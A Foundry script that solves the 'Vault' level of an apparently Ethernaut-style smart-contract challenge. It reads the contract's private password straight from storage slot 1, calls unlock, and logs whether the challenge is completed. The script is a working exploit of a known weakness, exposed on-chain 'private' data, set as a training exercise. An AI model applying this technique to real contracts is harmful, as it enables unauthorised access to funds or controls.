// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Vault} from "../src/8-Vault.sol";
import {VaultFactory} from "../src/VaultFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract VaultSolution is Script {
    Vault public vaultLevel;
    address payable instanceAddress =
        payable(0xda26Cc67cED579269BaaFa0fF7b5bc860e464B05);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        vaultLevel = Vault(instanceAddress);

        console.log("Is Vault locked before attack: %s", vaultLevel.locked());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // Password is in clear on the block explorer
        vaultLevel.unlock(vm.load(instanceAddress, bytes32(uint256(1))));
        vm.stopBroadcast();

        console.log("Is Vault locked after attack: %s", vaultLevel.locked());

        validate();
    }

    function validate() internal {
        bool isValidated = new VaultFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}
